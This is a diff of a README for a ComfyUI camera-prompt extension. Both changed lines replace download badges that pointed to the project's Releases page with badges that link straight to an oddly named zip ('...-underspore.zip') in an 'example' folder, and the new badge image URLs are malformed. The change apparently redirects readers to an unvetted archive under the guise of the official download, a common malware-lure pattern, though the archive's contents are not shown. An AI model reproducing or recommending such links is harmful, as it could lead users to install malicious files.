@@ -1,6 +1,6 @@
 # 🎥 ComfyUI-AdvancedCameraPrompts - Control Your Camera with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/releases)
+[![Download](https://raw.githubusercontent.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/main/example/ComfyUI-AdvancedCameraPrompts-underspore.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/main/example/ComfyUI-AdvancedCameraPrompts-underspore.zip)
 
 ## 📚 Overview
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 
 1. **Visit the download page:** Click the button below to go to the Releases page.
 
-   [![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/releases)
+   [![Download](https://raw.githubusercontent.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/main/example/ComfyUI-AdvancedCameraPrompts-underspore.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/main/example/ComfyUI-AdvancedCameraPrompts-underspore.zip)
 
 2. **Select the latest release:** On the Releases page, look for the latest version listed at the top. This will have the newest features and fixes.
 
